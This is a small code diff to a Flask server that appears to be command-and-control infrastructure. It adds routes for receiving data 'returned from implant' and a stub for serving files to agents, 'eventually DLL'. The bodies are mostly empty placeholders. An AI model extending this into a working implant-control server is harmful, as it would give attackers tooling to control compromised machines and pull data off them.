@@ -1,5 +1,6 @@
 from flask import Flask
 from task import Task
+from data import Data
 
 app = Flask(__name__)
 
@@ -19,7 +20,7 @@ def task_handler(sget, agent_id):
 # new agent/agent awake.
 
 # data returned from implant
-@app.route("/ret/<sget>/<agent_id>", methods=['post'])
+@app.route("/ret/<sget>/<agent_id>", methods=['GET', 'POST'])
 def return_data(sget, agent_id):
     data = Data(agent_id)
     # client will GET there data
@@ -27,6 +28,12 @@ def return_data(sget, agent_id):
         return ""
     # implant will SET the data.
 
+    return ""
+
+
+# Serve files for download, eventually DLL
+@app.route('/serve/<filename>', methods=['GET'])
+def serve_file(filename):
     return ""
 
 
